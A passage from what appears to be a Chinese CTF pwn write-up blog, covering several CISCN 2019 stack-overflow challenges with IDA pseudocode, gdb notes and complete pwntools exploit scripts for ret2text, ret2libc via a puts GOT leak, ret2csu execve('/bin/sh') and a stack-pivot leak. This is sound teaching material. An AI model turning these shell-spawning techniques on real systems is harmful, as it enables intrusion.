&#x27;0&#x27;  ; count</span><br><span class="line">.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:0000000000400514                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400517                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519                 retn</span><br><span class="line">.text:0000000000400519 vuln            endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26678)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">b&quot;c&quot;</span>+p64(main_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/zA0tpj"><a href="https://s1.ax1x.com/2022/11/14/zA0tpj.png" title="zA0tpj.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zA0tpj.png" alt="zA0tpj.png"></a></a></p><p>可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移</p><p>这里的原因暂时没有办法得知 先放着这个疑问</p><p>下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu</p><p>具体的流程我就不过多赘述了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">int59_addr = <span class="number">0x4004E2</span></span><br><span class="line">gadget2_addr = <span class="number">0x400596</span></span><br><span class="line">gadget1_addr = <span class="number">0x400580</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(int59_addr)+p64(gadget2_addr)</span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">payload += p64(binsh_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)</span><br><span class="line">payload += p64(rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>这里重点解释一下三个方面</p><p>1.为什么要多出一个p64(int59_addr)在栈上</p><p>这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的</p><p>2.binsh_addr和stack_addr的偏移是怎么求出来的</p><p>我们将断点打在csu执行到call r12那一行</p><p>然后gdb看一下栈</p><p><a href="https://imgse.com/i/zABw2d"><a href="https://s1.ax1x.com/2022/11/14/zABw2d.png" title="zABw2d.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zABw2d.png" alt="zABw2d.png"></a></a></p><p>可以计算出偏移为0x138</p><p>还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向</p><p>如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set $rsp = $rsp-0x150</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/zABhxs"><a href="https://s1.ax1x.com/2022/11/14/zABhxs.png" title="zABhxs.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zABhxs.png" alt="zABhxs.png"></a></a></p><p>看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26678)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">b&quot;c&quot;</span>+p64(main_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">int59_addr = <span class="number">0x4004E2</span></span><br><span class="line">gadget2_addr = <span class="number">0x400596</span></span><br><span class="line">gadget1_addr = <span class="number">0x400580</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(int59_addr)+p64(gadget2_addr)</span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)</span><br><span class="line">payload += p64(rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019华北-PWN1"><a href="#CISCN-2019华北-PWN1" class="headerlink" title="[CISCN 2019华北]PWN1"></a>[CISCN 2019华北]PWN1</h2><p>比较简单的一题 看一下保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132100197.png" title="image-20230313210003090" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132100197.png" alt="image-20230313210003090"></a></p><p>ida查看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数就很简单的清空了缓存区 顺便调用了func函数 跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考了一手浮点数传参 比较简单 由于这题保护开的比较少 所以也可以直接栈溢出</p><p>两种做法都演示一下吧 </p><p>1.浮点数传参</p><p>看一下汇编代码 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132103245.png" title="image-20230313210346196" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132103245.png" alt="image-20230313210346196"></a></p><p>movss是处理float精度的浮点数指令 这里顺便扩展一下知识点 处理double精度的浮点数用的是movsd</p><p>针对不同的字节数 还有movsb movsw  ‘b’ ‘w’ ‘d’  分别对应的一位 一字节 双字节</p><p>除此之外还有movzx movsx两兄弟</p><p>你可能也遇到过 我们编写如下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> a[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">char</span> a = <span class="number">120</span>;</span><br><span class="line">      a += <span class="number">9</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预期结果应该是129对吧 但是最后的输出结果却是</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132156627.png" title="image-20230313215600561" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132156627.png" alt="image-20230313215600561"></a></p><p>这是因为char类型变量只有单字节  也就是只有8位 哪怕是无符号数其范围也只有0-255 符号数范围只有-128-127</p><p>显然129就超过了其范围 需要进行扩展 例如利用int型进行一个中转</p><p>而movzx和movsx也起到同样的作用</p><p>movzx扩展的时候高位全补0  例如0xffff  补全成0x0000ffff</p><p>movsx扩展的时候根据符号位决定补1还是0 例如0xffff 是负数 那么补1 也就是0xffffffff</p><p>话归正题 我们索引一下浮点数应该是dword_4007F4</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132201499.png" title="image-20230313220125452" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132201499.png" alt="image-20230313220125452"></a></p><p>取其值传参 0x41348000</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28934</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x2c</span>)+p32(<span class="number">0x41348000</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4006A2&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>2.ret2text</p><p>很简单 直接贴exp吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28934)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x4006BE</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p32(backdoor_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4006A2&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019东北-PWN2"><a href="#CISCN-2019东北-PWN2" class="headerlink" title="[CISCN 2019东北]PWN2"></a>[CISCN 2019东北]PWN2</h2><p>比较简单的一题 打ret2text 但是NSS平台上没给libc文件 就用libcsearch来 不过这个也有坑 老版的已经没有维护了 得安装新版本的 新版本的是联网的</p><p><a href="https://github.com/Lan1keA/LibcSearcher">Lan1keA&#x2F;LibcSearcher: 🔍 LibcSearcher-ng – get symbols’ offset in glibc. (github.com)</a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132253822.png" title="image-20230313225350759" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132253822.png" alt="image-20230313225350759"></a></p><p>保护机制 我为了方便本地调试把libc依赖更换了 忽视即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>begin函数跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">begin</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Encrypt&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Decrypt&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Input your choice!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有encrypt函数有点东西 跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="string">&#x27;`&#x27;</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xC</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于我们输入的字符串s进行了加密 并且打印出来 不过由于没开canary和pie 又有gets函数 这里直接栈溢出打个ret2text就好了 唯一一点要注意的是就是最后要进行栈对齐 判断方法就是gdb动调一直n下去 卡住的时候如果sp指针末尾是8即需要栈对齐</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132259863.png" title="image-20230313225928768" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303132259863.png" alt="image-20230313225928768"></a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28610)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your choice!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_sym = <span class="number">0x4006e0</span></span><br><span class="line">back_addr = <span class="number">0x400A47</span></span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x50</span>+<span class="number">0x8</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_sym)+p64(start_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x400AEE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)</span><br><span class="line">ret_addr = <span class="number">0x00000000004006b9</span></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr :&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_addr = puts_addr - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_addr + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your choice!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x58</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019东南-PWN2"><a href="#CISCN-2019东南-PWN2" class="headerlink" title="[CISCN 2019东南]PWN2"></a>[CISCN 2019东南]PWN2</h2><p>看一下保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303141308134.png" title="image-20230314130819018" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303141308134.png" alt="image-20230314130819018"></a></p><p>ida看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别跟进一下init函数和vul函数</p><p>init函数就是清空了缓存区</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vul函数相当于主函数 分析一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了两次read的机会 rsi都是栈上的s 同时输入完了以后还进行了printf操作</p><p>没有开启canary和pie 存在栈溢出 栈溢出只有两个字长的距离 只够覆盖ebp和ret addr</p><p>猜测一手栈迁移 但是目前没有bss段的地址可写 也没有给栈上的地址 既然这样那我们就自己泄露吧</p><p>gdb动调一下  断点打在printf函数调用的时候</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303141318091.png" title="image-20230314131820981" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303141318091.png" alt="image-20230314131820981"></a></p><p>这里我选择的是ebp处存放的栈地址</p><p>printf函数遇到\0就会截停 所以我们只需要用垃圾数据覆盖esp到ebp之间的空间 就可以让printf函数一路畅通无阻 泄露出其内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28294</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u32(io.recvuntil(<span class="string">&quot;\xff&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p>随后就是栈迁移的部分了 gdb动调看一下我们第二次输入的s字符串的起始地址和泄露出来的栈地址偏移是多少 顺便在计算一下我们手动放入的binsh字符串的地址 最后利用题目已经给过的system函数构造rop链 